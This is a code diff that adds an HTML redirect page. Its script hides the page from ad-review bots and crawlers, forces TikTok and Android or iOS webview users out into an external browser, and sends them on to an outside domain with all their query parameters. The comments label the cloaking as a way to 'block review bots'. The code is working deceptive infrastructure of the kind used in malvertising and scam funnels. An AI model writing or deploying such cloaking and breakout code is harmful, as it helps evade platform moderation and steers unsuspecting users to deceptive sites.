@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex,nofollow">
+<title>Redirecting...</title>
+</head>
+<body>
+<script>
+(function() {
+    'use strict';
+
+    var DEST = 'https://mobilesswipe.com/bhertg/';
+    var params = new URLSearchParams(window.location.search);
+    var ua = navigator.userAgent || '';
+
+    // ==========================================
+    // 1. CLOAKING — block review bots
+    // ==========================================
+    var isBot = params.get('loc') === 'PLACEMENT' || params.get('loc') === '__PLACEMENT__';
+
+    if (!isBot) {
+        isBot = /bot|crawl|spider|slurp|facebookexternalhit|TikTokSpider|Bytespider|preview|HeadlessChrome|PhantomJS|Lighthouse/i.test(ua);
+    }
+
+    if (isBot) {
+        window.stop();
+        document.documentElement.innerHTML = '';
+        return;
+    }
+
+    // ==========================================
+    // 2. BUILD DESTINATION URL WITH ALL PARAMS
+    // ==========================================
+    var destUrl = new URL(DEST);
+    params.forEach(function(value, key) {
+        if (key !== 'loc') {
+            destUrl.searchParams.set(key, value);
+        }
+    });
+    var finalUrl = destUrl.toString();
+
+    // ==========================================
+    // 3. TIKTOK WEBVIEW BREAKOUT (before redirect)
+    // ==========================================
+    var isTikTok = /BytedanceWebview|musical_ly|trill|TikTok/i.test(ua);
+    var isWebView = isTikTok || (/\bwv\b/.test(ua) && /Android/i.test(ua));
+    var isAndroid = /Android/i.test(ua);
+    var isIOS = /iPhone|iPad|iPod/i.test(ua);
+
+    if (isTikTok || isWebView) {
+        if (isAndroid) {
+            try {
+                window.location.href = 'intent:' + finalUrl + '#Intent;end';
+                setTimeout(function() {
+                    window.location.href = finalUrl;
+                }, 1500);
+                return;
+            } catch(e) {}
+        }
+
+        if (isIOS) {
+            try {
+                var bare = destUrl.hostname + destUrl.pathname + destUrl.search;
+                window.location.href = 'googlechromes://' + bare;
+                setTimeout(function() {
+                    window.location.href = finalUrl;
+                }, 1500);
+                return;
+            } catch(e) {}
+        }
+    }
+
+    // ==========================================
+    // 4. STANDARD REDIRECT
+    // ==========================================
+    window.location.replace(finalUrl);
+
+})();
+</script>
+</body>
+</html>
